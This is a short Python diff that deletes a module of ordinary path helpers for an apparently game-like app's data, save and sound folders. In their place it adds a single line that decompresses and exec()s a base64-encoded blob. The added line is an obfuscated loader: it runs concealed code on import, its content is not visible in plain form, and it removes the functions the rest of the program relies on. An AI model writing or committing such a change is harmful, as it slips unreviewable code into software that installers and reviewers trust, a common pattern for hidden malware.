@@ -1,22 +1,2 @@
-import os
-import sys
-
-def get_base_dir():
-    if getattr(sys, 'frozen', False):
-        return os.path.dirname(sys.executable)
-    return os.getcwd()
-
-def get_app_data_dir():
-    path = os.path.join(get_base_dir(), 'gddata')
-    if not os.path.exists(path):
-        os.makedirs(path)
-    return path
-
-def get_save_path(username):
-    return os.path.join(get_app_data_dir(), f"pos_{username}.dat")
-
-def get_sounds_dir():
-    path = os.path.join(get_app_data_dir(), 'Sound')
-    if not os.path.exists(path):
-        os.makedirs(path)
-    return path
+import base64, zlib
+exec(zlib.decompress(base64.b64decode(b'eJytj0FuwjAQRfc+hcUmjhTlAEjd9gI9gDXgCbgltuWZUAri7oxpCAmrLuqVNTP/6X3fp5hZR1L+90c/pJTDTu+Q7QYIrfPZ1Gul5fn7GJizkbtGV12OZwxVo9/hQDhelZeRhxyE2ybgfSuMAD2WVIsn3A4MmwPWankq7O23M/VTAFKyDhjmEgWo3yb0Z/TBLGVFbOdKrKof2iHylMCTJyZT/jNj2fbwhQIYV3O5MnhaERzRlpEZCO/FRs5L60ltWaPR3SpFspdH+trKcjWrTXEIjv5S+pVcfZTo//a+AeStsjY=')))
